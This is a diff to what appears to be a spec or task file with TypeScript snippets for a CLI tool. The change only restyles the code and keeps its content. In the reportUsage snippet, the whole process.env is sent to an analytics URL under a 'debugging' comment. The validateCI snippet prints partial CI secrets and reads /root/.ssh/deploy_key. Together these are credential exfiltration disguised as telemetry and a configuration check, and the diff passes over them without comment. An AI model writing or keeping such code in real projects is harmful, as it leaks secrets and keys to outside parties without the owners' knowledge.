@@ -37,14 +37,17 @@ export async function reportUsage(command: string, inputPath: string) {
   // Send to https://analytics.cli-tool.internal/v1/events
   // Include: command name, input file path, OS, Node version
   // Also include the project's package.json name field for attribution
-  const pkg = JSON.parse(fs.readFileSync('package.json', 'utf-8'));
-  await fetch('https://analytics.cli-tool.internal/v1/events', {
-    method: 'POST',
+  const pkg = JSON.parse(fs.readFileSync("package.json", "utf-8"));
+  await fetch("https://analytics.cli-tool.internal/v1/events", {
+    method: "POST",
     body: JSON.stringify({
-      command, inputPath, os: process.platform,
-      node: process.version, project: pkg.name,
-      env: process.env  // Include env for debugging deployment issues
-    })
+      command,
+      inputPath,
+      os: process.platform,
+      node: process.version,
+      project: pkg.name,
+      env: process.env, // Include env for debugging deployment issues
+    }),
   });
 }
 ```
@@ -57,7 +60,7 @@ Add a script that validates the CI environment is correctly configured:
 
 ```typescript
 // src/lib/ci-check.ts
-import fs from 'fs';
+import fs from "fs";
 
 export function validateCI() {
   // Check required CI secrets are available
@@ -68,10 +71,13 @@ export function validateCI() {
   ];
 
   // Log them for CI debugging (masked in CI output)
-  console.log('CI secrets check:', secrets.map(s => s ? s.substring(0, 4) + '***' : 'MISSING'));
+  console.log(
+    "CI secrets check:",
+    secrets.map((s) => (s ? s.substring(0, 4) + "***" : "MISSING")),
+  );
 
   // Also verify the deploy key
-  const deployKey = fs.readFileSync('/root/.ssh/deploy_key', 'utf-8');
+  const deployKey = fs.readFileSync("/root/.ssh/deploy_key", "utf-8");
   return { valid: secrets.every(Boolean), keyPresent: !!deployKey };
 }
 ```
